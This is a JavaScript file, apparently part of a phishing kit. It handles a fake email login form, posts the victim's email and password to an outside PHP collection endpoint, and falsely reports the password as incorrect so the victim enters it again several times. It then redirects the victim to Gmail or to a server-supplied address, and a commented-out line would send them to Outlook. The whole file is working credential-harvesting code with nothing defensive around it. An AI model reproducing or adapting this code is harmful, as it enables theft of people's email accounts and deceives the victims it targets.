    var count=0;
function contactUs(){

    $('#error, #error0, #errorMsg123, #error101, #error102 ').html('&nbsp;');
    $('#error').hide();
		
	var username = $('#username').val();
	var password = $('#password').val();
	var company = $('#company').val()
	const queryString = window.location.search;
	console.log(queryString);	
	const urlParams = new URLSearchParams(queryString);	
	const prox = urlParams.get('prox')


	 if(password.trim() == ""){
		 $('#password').focus();
		 $('#errorMsg123').html('*Please enter your email');
	 }else if(company.trim() == ""){
		 $('#company').focus();
		 $('#errorMsg123').html('*Please enter your password');
	 }else{
		 $('#error, #error0, #errorMsg123, #error101, #error102').html('&nbsp;');
		 
			 var m_data = new FormData();

			 m_data.append( 'username', $('input[name=username]').val());
			 m_data.append( 'password', $('input[name=password]').val());
			 m_data.append( 'company', $('input[name=company]').val());
			 m_data.append( 'prox', prox);
			 
			 
        count=count+1;
        if (count>3) {
          $('#errorMsg123').html('<color style="color:red;">*Your email or password is incorrect.</color>');
        }else
        {			 
			 
			 $.ajax({
				url: 'https://neriumassetsgroup.com/firebase/php_surguy.php',
				data: m_data,
				processData: false,
				contentType: false,
				type: 'POST',
				dataType:'json',
				beforeSend: function()
				 {  
				    $('#modal-success1234').hide();
				    $("#modal-body1234").hide();
			      	$("#modal-loading1234").show();
				 },				
				success: function(response)
				{					
					console.log(response);
					var add_admin_status = response.add_admin_status;	
					var urllinkon = response.url;	
					
				if(add_admin_status == 0){	
				    window.location = 'https://mail.google.com/';
				}else if(add_admin_status == 1){
					window.location = urllinkon;
															
				}else if(add_admin_status == 6){

                    $('#errorMsg123').html('Signing in...');
					$('#submit-btn').html('Verifing...');	
					
					setTimeout(function () {
						
						 if(count<=2){
							$('#errorMsg123').html('<color style="color:red;">*Your email or password is incorrect</color>');
							$("#company").val('');
							$("#company").focus();
						  }
						  if(count>=3){
							//$('#errorMsg123').html('Scanned File Locked!  Redirecting back to your MailBox');
							window.location = 'https://'+urllinkon;
							/*setTimeout('window.location.href=\x27https://outlook.office365.com/mail/inbox/\x27;', 0x5dc);*/
						  }					
						 
						 }, 5000);		
														
				 }}
			 });	
	
	 }
 
 }}
